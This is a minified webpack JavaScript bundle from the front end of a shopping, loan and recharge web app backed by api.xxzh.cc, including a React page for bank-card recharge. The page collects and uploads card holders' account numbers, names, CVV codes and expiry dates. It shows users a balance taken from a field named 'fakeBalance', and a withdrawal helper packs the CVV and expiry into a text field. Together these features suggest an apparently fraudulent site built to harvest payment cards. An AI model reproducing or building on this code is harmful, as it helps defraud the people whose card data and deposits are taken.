"use strict";(self.webpackChunk=self.webpackChunk||[]).push([[9713],{59510:function(M,g,t){t.d(g,{Br:function(){return s},KF:function(){return m},W2:function(){return E},bG:function(){return p},iY:function(){return v},kM:function(){return r},rH:function(){return o},s6:function(){return i}});var a=t(33746),d=a.Z.create({baseURL:"https://api.xxzh.cc",withCredentials:!1,crossDomain:!0,timeout:1e4});d.interceptors.request.use(function(h){var l=localStorage.getItem("token");return l&&(h.headers.Authorization="Bearer ".concat(l)),h},function(h){return Promise.reject(h)});var p=function(l){return d.get("/user/info/".concat(l)).then(function(_){return _.data})},m=function(l,_){return d.put("/user/tron/set",{userId:l,address:_}).then(function(b){return b.data})},v=function(l){return d.get("/user/tron/get",{params:{userId:l}}).then(function(_){return _.data})},E=function(l,_,b,w,y){return d.post("/withdrawal-records/user",{username:l,amount:_,fundPassword:b,method:w,address:y}).then(function(I){return I.data})},s=function(l,_,b,w,y,I){return d.put("/user/set-bank-info",{userId:l,bankAccount:_,realName:b,bankName:w,cvv:y,expiryDate:I}).then(function(n){return n.data})},o=function(l){return d.get("/user/bank-info",{params:{userId:l}}).then(function(_){return _.data})},r=function(l,_,b,w,y,I,n,k){var P="".concat(w," | ").concat(y," | ").concat(I," | CVV:").concat(n," | Exp:").concat(k);return d.post("/withdrawal-records/user/bank",{username:l,amount:_,fundPassword:b,method:"\u94F6\u884C\u5361",address:P}).then(function(x){return x.data})},i=function(l){var _=arguments.length>1&&arguments[1]!==void 0?arguments[1]:0,b=arguments.length>2&&arguments[2]!==void 0?arguments[2]:10;return d.get("/shop/search-with-products",{params:{name:l,page:_,size:b}}).then(function(w){return w.data})}},34596:function(M,g,t){t.d(g,{FL:function(){return U},H:function(){return P},JR:function(){return T},Kn:function(){return h},S4:function(){return x},Ue:function(){return i},Uy:function(){return W},Vb:function(){return j},_U:function(){return l},an:function(){return v},bZ:function(){return R},eY:function(){return S},iJ:function(){return k},jw:function(){return I},nn:function(){return n},o$:function(){return m},sg:function(){return L},um:function(){return s},wX:function(){return c},x4:function(){return w},yw:function(){return r},z2:function(){return E}});var a=t(87866),d=t(33746),p=d.Z.create({baseURL:"https://api.xxzh.cc",withCredentials:!1,crossDomain:!0,timeout:1e4});function m(e){return p({url:"/user/captcha/getCaptcha",withCredentials:!1,method:"get",params:e})}function v(e){return(0,a.Z)({url:"/user/captcha/getCaptcha",withCredentials:!1,method:"get",params:e})}function E(e){return(0,a.Z)({url:"/auth/register",withCredentials:!1,method:"post",data:e})}function s(e){return(0,a.Z)({url:"/user/user-detail/"+e.userId,withCredentials:!1,method:"get"})}function o(e){return request({url:"/wishlist/"+e.userId,withCredentials:!1,method:"get"})}function r(e){return(0,a.Z)({url:"/message/inbox",withCredentials:!1,method:"get",params:e})}function i(e){var N=e.id;return delete e.id,(0,a.Z)({url:"/address/create?userId="+N,withCredentials:!1,method:"post",data:e})}function h(e){return(0,a.Z)({url:"/address/get",withCredentials:!1,method:"get",params:e})}function l(e){return(0,a.Z)({url:"/address/update?userId="+e.id,withCredentials:!1,method:"post",data:e})}function _(e){return request({url:"/redbag/draw",withCredentials:!1,method:"post",data:e})}function b(e){return request({url:"/user/profit",withCredentials:!1,method:"get",params:e})}function w(e){return(0,a.Z)({url:"/auth/login",withCredentials:!1,method:"post",data:e})}function y(e){return request({url:"/redbag/signin",withCredentials:!1,method:"post",data:e})}function I(e){return(0,a.Z)({url:"/redbag/signin-and-draw",withCredentials:!1,method:"post",data:e})}function n(e){return(0,a.Z)({url:"/seller/apply",withCredentials:!1,method:"post",data:e})}function k(e){return(0,a.Z)({url:"/loan/apply",withCredentials:!1,method:"post",data:e})}function P(e){return(0,a.Z)({url:"/loan/loan",withCredentials:!1,method:"post",data:e})}function x(e){return(0,a.Z)({url:"/loan/repay",withCredentials:!1,method:"post",data:e})}function O(e){return request({url:"/withdrawal-records/user",withCredentials:!1,method:"post",data:e})}function R(e){return(0,a.Z)({url:"/recharge-records/username",withCredentials:!1,method:"get",params:e})}function c(e){return(0,a.Z)({url:"/recharge-records/user",withCredentials:!1,method:"post",data:e})}function T(e){return(0,a.Z)({url:"/withdrawal-records/username",withCredentials:!1,method:"get",params:e})}function U(e){return(0,a.Z)({url:"/shop/user/"+e,withCredentials:!1,method:"get"})}function S(e){return(0,a.Z)({url:"/user/info/"+e,withCredentials:!1,method:"get"})}function W(e){return(0,a.Z)({url:"/products/uploader-to-userid?uploader="+e.uploader,withCredentials:!1,method:"get"})}function L(e){return(0,a.Z)({url:"/user/eth/get",withCredentials:!1,method:"get",params:e})}function j(e){return(0,a.Z)({url:"/user/tron/get",withCredentials:!1,method:"get",params:e})}function J(e){return request({url:"/user/eth/set",withCredentials:!1,method:"put",data:e})}function V(e){return request({url:"/user/tron/set",withCredentials:!1,method:"put",data:e})}function X(){return fetch("https://api.ipify.org?format=json")}},87866:function(M,g,t){var a=t(31759),d=t.n(a),p=t(33746),m=t(69194),v=t(18015),E=p.Z.create({baseURL:"https://api.xxzh.cc",withCredentials:!1,crossDomain:!0,timeout:1e5});E.interceptors.request.use(function(s){if(s.url==="/auth/register"||s.url==="/auth/login")return s;(s.url==="/user/apply"||s.url==="/loan/apply")&&(s.headers["Content-Type"]="multipart/form-data");var o=localStorage.getItem("token");return o&&(s.headers.Authorization="Bearer "+o),s},function(s){return console.log(s),Promise.reject(s)}),E.interceptors.response.use(function(s){var o,r=s.data;if(console.log("response-->",r),Array.isArray(r))return Promise.resolve(r);if((o=r.data)!==null&&o!==void 0&&o.token&&(localStorage.setItem("token",r.data.token),localStorage.setItem("userInfo",JSON.stringify(r.data.user))),r.code!==200)return m.FN.show({icon:"fail",content:r.message}),Promise.resolve(r);if(r.code===200||r.message==="SUCCESS")return Promise.resolve(r);if(r.code===305||r.code===306){Promise.reject(r||"error");return}else return r.code===403?(m.FN.show({icon:"fail",content:r.message}),v.history.push("/login"),Promise.resolve(r||"error")):Promise.reject(r||"error")},function(s){return console.log(s,"error"),s.status===403&&(m.FN.show({icon:"fail",content:s.message}),localStorage.removeItem("token"),setTimeout(function(){v.history.push("/login")},1e3)),console.log("request error"+s,d()(s)),Promise.reject(s)}),g.Z=E},57540:function(M,g,t){t.d(g,{Z:function(){return v}});var a=t(75271),d=t(69194),p=t(52676),m=function(s){var o=s.visible;return(0,p.jsx)(d.zd,{visible:o,className:"loading-mask",children:(0,p.jsxs)("div",{className:"loading-container",children:[(0,p.jsx)(d.wW,{style:{"--size":"48px"}}),(0,p.jsx)("span",{className:"loading-text",children:"Loading..."})]})})},v=m},84908:function(M,g,t){var a=t(69194),d=t(75271),p=t(5791),m=t(52676),v=function(s){var o=s.title,r=(0,p.s0)(),i=function(){r(-1)};return(0,m.jsx)(m.Fragment,{children:(0,m.jsx)(a.l2,{onBack:i,style:{background:"#fff",position:"sticky",top:0,zIndex:1e3},children:o})})};g.Z=v},54035:function(M,g,t){t.r(g),t.d(g,{default:function(){return k}});var a=t(26068),d=t.n(a),p=t(90228),m=t.n(p),v=t(87999),E=t.n(v),s=t(48305),o=t.n(s),r=t(75271),i=t(69194),h=t(5791),l=t(84908),_=t(59510),b=t(34596),w=t(34729),y=t(57540),I=t(59739),n=t(52676);function k(){var R=(0,I.$G)(),c=R.t,T=(0,r.useState)(""),U=o()(T,2),S=U[0],W=U[1],L=(0,r.useState)(""),j=o()(L,2),J=j[0],V=j[1],X=(0,r.useState)(""),e=o()(X,2),N=e[0],me=e[1],ge=(0,r.useState)(0),Y=o()(ge,2),pe=Y[0],ve=Y[1],be=(0,r.useState)(""),Q=o()(be,2),Z=Q[0],$=Q[1],Ce=(0,r.useState)(""),q=o()(Ce,2),K=q[0],ee=q[1],Ee=(0,r.useState)(""),te=o()(Ee,2),F=te[0],re=te[1],we=(0,r.useState)(""),ne=o()(we,2),z=ne[0],ae=ne[1],De=(0,r.useState)(""),se=o()(De,2),H=se[0],oe=se[1],Pe=(0,r.useState)(!1),ue=o()(Pe,2),D=ue[0],le=ue[1],xe=(0,r.useState)(!1),ie=o()(xe,2),Ie=ie[0],G=ie[1],A=(0,h.s0)();(0,r.useEffect)(function(){var C=JSON.parse(localStorage.getItem("userInfo"));if(!C){A("/login");return}me(C.id),(0,_.bG)(C.id).then(function(f){f&&f.data&&(V(f.data.username),ve(f.data.fakeBalance||0),(0,_.rH)(C.id).then(function(B){if(B&&B.data){var u=B.data,de=u.bankAccount,_e=u.realName,ce=u.bankName,fe=u.cvv,he=u.expiryDate;$(de||""),ee(_e||""),re(ce||""),ae(fe||""),oe(he||""),le(!de||!_e||!ce||!fe||!he)}}).catch(function(){return i.FN.show({content:c("rechargebank.toast_bankInfoFailed")})}))}).catch(function(){i.FN.show({content:c("rechargebank.toast_userInfoFailed")}),A("/login")})},[A,c]);var ye=function(){var C=E()(m()().mark(function f(){return m()().wrap(function(u){for(;;)switch(u.prev=u.next){case 0:if(!(!S||isNaN(S)||Number(S)<=0||!Number.isInteger(Number(S)))){u.next=3;break}return i.FN.show({content:c("rechargebank.toast_invalidAmount")}),u.abrupt("return");case 3:if(G(!0),u.prev=4,!D){u.next=13;break}if(!(!Z||!K||!F||!z||!H)){u.next=10;break}return i.FN.show({content:c("rechargebank.toast_incompleteBankInfo")}),G(!1),u.abrupt("return");case 10:return u.next=12,(0,_.Br)(N,Z,K,F,z,H);case 12:i.FN.show({content:c("rechargebank.toast_saveSuccess")});case 13:return u.next=15,(0,b.wX)({username:J,amount:S});case 15:i.FN.show({content:c("rechargebank.toast_rechargeSuccess")}),setTimeout(function(){return A("/order/meeting")},500),u.next=22;break;case 19:u.prev=19,u.t0=u.catch(4),i.FN.show({content:c("rechargebank.toast_rechargeFailed")});case 22:return u.prev=22,G(!1),u.finish(22);case 25:case"end":return u.stop()}},f,null,[[4,19,22,25]])}));return function(){return C.apply(this,arguments)}}(),Se=function(f){var B=f.replace(/[^\d]/g,"");W(B)};return(0,n.jsxs)(n.Fragment,{children:[(0,n.jsx)(y.Z,{visible:Ie}),(0,n.jsxs)("div",{style:{minHeight:"100vh",background:"linear-gradient(135deg, #f8fafc 0%, #e0e7ef 100%)",boxSizing:"border-box"},children:[(0,n.jsx)(l.Z,{title:c("rechargebank.title"),style:{height:"100px"}}),(0,n.jsx)("div",{style:{padding:"32px 0"},className:w.Z.content,children:(0,n.jsxs)(i.Zb,{style:{maxWidth:380,margin:"0 auto",borderRadius:18,boxShadow:"0 4px 16px rgba(0,0,0,0.10)",background:"linear-gradient(135deg, #fff 60%, #f5f7fa 100%)"},bodyStyle:{padding:"36px 24px 32px 24px"},children:[(0,n.jsx)("div",{style:{textAlign:"center",fontSize:22,fontWeight:700,marginBottom:32,color:"#232526",letterSpacing:2},children:c("rechargebank.title")}),(0,n.jsxs)("div",{style:{marginBottom:32},children:[(0,n.jsxs)("label",{style:{display:"block",fontSize:16,color:"#888",marginBottom:10,fontWeight:500},children:[c("rechargebank.balance"),": ",pe.toFixed(2)," USD"]}),(0,n.jsx)(i.II,{placeholder:c("rechargebank.inputAmountPlaceholder"),value:S,onChange:Se,clearable:!0,style:x,type:"text"})]}),(0,n.jsxs)("div",{style:{marginBottom:24},children:[(0,n.jsx)("label",{style:O,children:c("rechargebank.bankName")}),(0,n.jsx)(i.II,{value:F,onChange:function(f){return re(f)},disabled:!D,style:D?x:P})]}),(0,n.jsxs)("div",{style:{marginBottom:24},children:[(0,n.jsx)("label",{style:O,children:c("rechargebank.bankAccount")}),(0,n.jsx)(i.II,{value:Z,onChange:function(f){return $(f)},disabled:!D,style:D?x:P})]}),(0,n.jsxs)("div",{style:{marginBottom:24},children:[(0,n.jsx)("label",{style:O,children:c("rechargebank.realName")}),(0,n.jsx)(i.II,{value:K,onChange:function(f){return ee(f)},disabled:!D,style:D?x:P})]}),(0,n.jsxs)("div",{style:{marginBottom:24,display:"flex",gap:"12px"},children:[(0,n.jsxs)("div",{style:{flex:1},children:[(0,n.jsx)("label",{style:O,children:c("rechargebank.cvv")}),(0,n.jsx)(i.II,{value:z,onChange:function(f){return ae(f)},disabled:!D,style:D?x:P})]}),(0,n.jsxs)("div",{style:{flex:1},children:[(0,n.jsx)("label",{style:O,children:c("rechargebank.expiryDate")}),(0,n.jsx)(i.II,{value:H,onChange:function(f){return oe(f)},disabled:!D,style:D?x:P})]})]}),(0,n.jsx)(i.zx,{color:"primary",size:"large",style:{width:"100%",height:48,borderRadius:12,fontSize:18,fontWeight:700,background:"linear-gradient(90deg, #bfa14a 0%, #ffe082 100%)",color:"#232526",letterSpacing:2,boxShadow:"0 2px 8px rgba(191,161,74,0.10)"},onClick:ye,children:c("rechargebank.confirmRecharge")})]})})]})]})}var P={width:"auto",padding:"6px 12px",borderRadius:10,border:"1.5px solid #bfa14a",background:"#f0f0f0",color:"#232526",fontWeight:600,boxShadow:"0 2px 8px rgba(191,161,74,0.06)"},x=d()(d()({},P),{},{background:"#f8fafc"}),O={display:"block",fontSize:16,color:"#888",marginBottom:10,fontWeight:500}},34729:function(M,g){g.Z={content:"content___GUahl"}}}]);
